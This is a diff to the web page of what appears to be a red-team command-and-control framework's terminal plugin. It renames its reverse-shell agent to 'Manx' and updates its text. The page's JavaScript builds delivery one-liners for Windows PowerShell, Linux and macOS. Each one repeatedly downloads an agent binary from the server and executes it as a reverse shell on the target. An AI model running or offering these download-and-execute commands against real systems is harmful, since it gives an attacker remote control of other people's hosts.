@@ -24,10 +24,12 @@
 
                     <div class="column section-border" style="flex:25%;text-align:left;padding:15px;">
                          <h1 style="font-size:70px;margin-top:-20px;">Terminal</h1>
-                         <h2 style="margin-top:-55px">reverse-shell operations</h2>
+                         <h2 style="margin-top:-55px">& the Manx agent</h2>
                          <p>
-                             The terminal plugin gives you the power of reverse-shells. Through these shells you
-                             can manually interact with any host.
+                             The terminal plugin comes with the Manx agent, which communicates to the server over a raw
+                             TCP socket. In addition to operating as a normal agent, Manx doubles as a reverse-shell.
+                             When you deploy it, you will see sessions <i>pop</i> up below, allowing you to manually
+                             interact with the compromised host.
                          </p>
                          <br>
                         <select id="dcommands" style="width:60%;" onchange="displayCommand()">
@@ -129,11 +131,11 @@
             let x = $('#delivery-command');
             let http = location.protocol+'//'+location.hostname+(location.port ? ':'+location.port: '');
             if(selected_option === 'windows-psh') {
-                x.text('$url="'+http+'/file/download"; $wc=New-Object System.Net.WebClient; $wc.Headers.add("platform","windows"); $wc.Headers.add("file","reverse.go"); while($true) {try {($data=$wc.DownloadData($url)) -and ($name=$wc.ResponseHeaders["Content-Disposition"].Substring($wc.ResponseHeaders["Content-Disposition"].IndexOf("filename=")+9).Replace("`"","")) -and ([io.file]::WriteAllBytes("C:\\Users\\Public\\$name.exe",$data)) | Out-Null; iex "C:\\Users\\Public\\$name.exe -http '+http+' -tcp '+tcpPort+'"} catch{}; sleep 60}');
+                x.text('$url="'+http+'/file/download"; $wc=New-Object System.Net.WebClient; $wc.Headers.add("platform","windows"); $wc.Headers.add("file","manx.go"); while($true) {try {($data=$wc.DownloadData($url)) -and ($name=$wc.ResponseHeaders["Content-Disposition"].Substring($wc.ResponseHeaders["Content-Disposition"].IndexOf("filename=")+9).Replace("`"","")) -and ([io.file]::WriteAllBytes("C:\\Users\\Public\\$name.exe",$data)) | Out-Null; iex "C:\\Users\\Public\\$name.exe -http '+http+' -tcp '+tcpPort+'"} catch{}; sleep 60}');
             } else if (selected_option === 'linux') {
-                x.text('while true; do agent=$(curl -svkOJ -X POST -H \'file:reverse.go\' -H \'platform:linux\' '+http+'/file/download 2>&1 | grep -i \'Content-Disposition\' | grep -io \'filename=.*\' | cut -d\'=\' -f2 | tr -d \'"\\r\') && chmod +x $agent 2>/dev/null && ./$agent -http '+http+' -tcp '+tcpPort+'; sleep 60; done');
+                x.text('while true; do agent=$(curl -svkOJ -X POST -H \'file:manx.go\' -H \'platform:linux\' '+http+'/file/download 2>&1 | grep -i \'Content-Disposition\' | grep -io \'filename=.*\' | cut -d\'=\' -f2 | tr -d \'"\\r\') && chmod +x $agent 2>/dev/null && ./$agent -http '+http+' -tcp '+tcpPort+'; sleep 60; done');
             } else if (selected_option === 'darwin') {
-                x.text('while true; do agent=$(curl -svkOJ -X POST -H \'file:reverse.go\' -H \'platform:darwin\' '+http+'/file/download 2>&1 | grep -i \'Content-Disposition\' | grep -io \'filename=.*\' | cut -d\'=\' -f2 | tr -d \'"\\r\') && chmod +x $agent 2>/dev/null && ./$agent -http '+http+' -tcp '+tcpPort+'; sleep 60; done');
+                x.text('while true; do agent=$(curl -svkOJ -X POST -H \'file:manx.go\' -H \'platform:darwin\' '+http+'/file/download 2>&1 | grep -i \'Content-Disposition\' | grep -io \'filename=.*\' | cut -d\'=\' -f2 | tr -d \'"\\r\') && chmod +x $agent 2>/dev/null && ./$agent -http '+http+' -tcp '+tcpPort+'; sleep 60; done');
             }
             $('#copyCommand').show();
          }
